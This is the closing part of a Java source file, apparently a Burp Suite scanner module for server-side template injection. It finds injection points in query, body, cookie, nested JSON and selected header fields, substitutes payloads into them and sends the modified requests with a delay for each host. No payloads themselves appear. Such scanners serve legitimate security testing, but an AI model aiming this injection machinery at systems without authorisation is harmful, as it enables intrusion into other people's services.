    private HttpRequestResponse sendPayload(HttpRequestResponse original, InjectionTarget target, String payload) {
        try {
            HttpRequest modified = injectPayload(original.request(), target, payload);
            return api.http().sendRequest(modified);
        } catch (Exception e) {
            return null;
        }
    }

    private HttpRequest injectPayload(HttpRequest request, InjectionTarget target, String payload) {
        switch (target.type) {
            case QUERY:
                return request.withUpdatedParameters(
                        HttpParameter.urlParameter(target.name, PayloadEncoder.encode(payload)));
            case BODY:
                return request.withUpdatedParameters(
                        HttpParameter.bodyParameter(target.name, PayloadEncoder.encode(payload)));
            case COOKIE:
                return PayloadEncoder.injectCookie(request, target.name, payload);
            case JSON:
                String body = request.bodyToString();
                String escaped = payload.replace("\\", "\\\\").replace("\"", "\\\"");
                if (target.name.contains(".")) {
                    // Nested key — parse, replace, serialize (pass raw payload; Gson escapes internally)
                    String newBody = replaceNestedJsonValue(body, target.name, payload);
                    return request.withBody(newBody);
                } else {
                    String jsonPattern = "\"" + java.util.regex.Pattern.quote(target.name) + "\"\\s*:\\s*(?:\"[^\"]*\"|\\d+(?:\\.\\d+)?|true|false|null)";
                    String replacement = "\"" + target.name + "\": \"" + escaped + "\"";
                    String newBody = body.replaceFirst(jsonPattern, replacement);
                    return request.withBody(newBody);
                }
            case HEADER:
                return request.withRemovedHeader(target.name).withAddedHeader(target.name, payload);
            default:
                return request;
        }
    }

    /**
     * Replace a value at a dot-notation path in a JSON string.
     * E.g., path "user.profile.name" replaces the value at obj.user.profile.name.
     */
    private String replaceNestedJsonValue(String jsonBody, String dotPath, String escapedValue) {
        try {
            com.google.gson.JsonElement root = com.google.gson.JsonParser.parseString(jsonBody);
            if (!root.isJsonObject()) return jsonBody;

            String[] parts = dotPath.split("\\.");
            com.google.gson.JsonObject current = root.getAsJsonObject();

            // Traverse to the parent of the target key
            for (int i = 0; i < parts.length - 1; i++) {
                com.google.gson.JsonElement child = current.get(parts[i]);
                if (child == null || !child.isJsonObject()) return jsonBody;
                current = child.getAsJsonObject();
            }

            // Replace the leaf value
            String leafKey = parts[parts.length - 1];
            if (current.has(leafKey)) {
                current.addProperty(leafKey, escapedValue);
            }

            return new com.google.gson.Gson().toJson(root);
        } catch (Exception e) {
            return jsonBody;
        }
    }

    private List<InjectionTarget> extractTargets(HttpRequest request) {
        List<InjectionTarget> targets = new ArrayList<>();
        for (var param : request.parameters()) {
            switch (param.type()) {
                case URL:
                    targets.add(new InjectionTarget(param.name(), param.value(), TargetType.QUERY));
                    break;
                case BODY:
                    targets.add(new InjectionTarget(param.name(), param.value(), TargetType.BODY));
                    break;
                case COOKIE:
                    targets.add(new InjectionTarget(param.name(), param.value(), TargetType.COOKIE));
                    break;
            }
        }
        // JSON params (recursive for nested objects)
        String ct = "";
        for (var h : request.headers()) {
            if (h.name().equalsIgnoreCase("Content-Type")) { ct = h.value(); break; }
        }
        if (ct.contains("application/json")) {
            try {
                String body = request.bodyToString();
                if (body != null) {
                    com.google.gson.JsonElement el = com.google.gson.JsonParser.parseString(body);
                    if (el.isJsonObject()) {
                        extractJsonParams(el.getAsJsonObject(), "", targets);
                    }
                }
            } catch (Exception ignored) {}
        }

        // Extract injectable request headers
        String[] headerTargets = {"User-Agent", "Referer", "X-Forwarded-For", "X-Forwarded-Host", "Origin"};
        for (String headerName : headerTargets) {
            for (var h : request.headers()) {
                if (h.name().equalsIgnoreCase(headerName)) {
                    targets.add(new InjectionTarget(h.name(), h.value(), TargetType.HEADER));
                    break;
                }
            }
        }

        return targets;
    }

    /**
     * Recursively extract JSON parameters using dot-notation for nested objects.
     */
    private void extractJsonParams(com.google.gson.JsonObject obj, String prefix, List<InjectionTarget> targets) {
        for (String key : obj.keySet()) {
            com.google.gson.JsonElement val = obj.get(key);
            String fullKey = prefix.isEmpty() ? key : prefix + "." + key;
            if (val.isJsonPrimitive() && (val.getAsJsonPrimitive().isString() || val.getAsJsonPrimitive().isNumber())) {
                targets.add(new InjectionTarget(fullKey, val.getAsString(), TargetType.JSON));
            } else if (val.isJsonObject()) {
                extractJsonParams(val.getAsJsonObject(), fullKey, targets);
            }
        }
    }

    private String extractPath(String url) {
        try {
            if (url.contains("://")) url = url.substring(url.indexOf("://") + 3);
            int s = url.indexOf('/');
            if (s >= 0) { int q = url.indexOf('?', s); return q >= 0 ? url.substring(s, q) : url.substring(s); }
        } catch (Exception ignored) {}
        return url;
    }

    private void perHostDelay() throws InterruptedException {
        int delay = config.getInt("ssti.perHostDelay", 500);
        if (delay > 0) Thread.sleep(delay);
    }

    @Override
    public void destroy() { tested.clear(); }

    private enum TargetType { QUERY, BODY, COOKIE, JSON, HEADER }

    private static class InjectionTarget {
        final String name, originalValue;
        final TargetType type;
        InjectionTarget(String n, String v, TargetType t) { name = n; originalValue = v != null ? v : ""; type = t; }
    }

    public ConcurrentHashMap<String, Boolean> getTested() { return tested; }
}
